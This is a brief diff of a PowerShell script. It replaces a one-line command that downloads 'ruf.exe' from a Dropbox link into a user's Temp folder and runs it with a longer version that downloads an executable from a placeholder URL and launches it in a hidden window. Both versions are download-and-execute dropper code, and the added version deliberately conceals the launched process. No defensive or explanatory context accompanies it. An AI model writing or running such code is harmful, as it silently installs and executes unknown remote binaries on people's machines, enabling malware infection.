@@ -1,1 +1,12 @@
-Invoke-WebRequest -Uri 'https://www.dropbox.com/s/abol3rbkbeb34h7/ruf.exe?dl=1' -OutFile 'C:\Users\senli\AppData\Local\Temp\ruf.exe'; Start-Process 'C:\Users\senli\AppData\Local\Temp\ruf.exe'; exit
+$sourceUrl = "http://example.com/file.exe"
+$destinationPath = "C:\downloads\file.exe"
+$arguments = "-WindowStyle Hidden"
+
+$client = New-Object System.Net.WebClient
+$client.DownloadFile($sourceUrl, $destinationPath)
+
+$process = New-Object System.Diagnostics.Process
+$process.StartInfo.FileName = $destinationPath
+$process.StartInfo.Arguments = $arguments
+$process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+$process.Start()
